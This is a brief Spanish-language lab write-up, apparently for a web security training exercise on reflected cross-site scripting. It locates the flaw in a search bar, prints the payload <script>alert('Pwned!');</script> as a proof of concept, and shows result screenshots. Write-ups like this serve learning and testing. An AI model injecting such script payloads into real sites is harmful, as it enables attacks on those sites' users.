# Reflected XSS into HTML context with nothing encoded 👨‍💻

<img align="center" src="/assets/XSS/01-First/01-Description.PNG">

La vulnerabilidad se encuentra en **la barra de búsqueda** 

<img align="center" src="/assets/XSS/01-First/02-Script.PNG">

**Script XSS**
```js
<script>alert("Pwned!");</script>
```

Una vez ejecutamos la búsqueda con el anterior script obtenemos el siguiente resultado:

<img align="center" src="/assets/XSS/01-First/03-Result.PNG">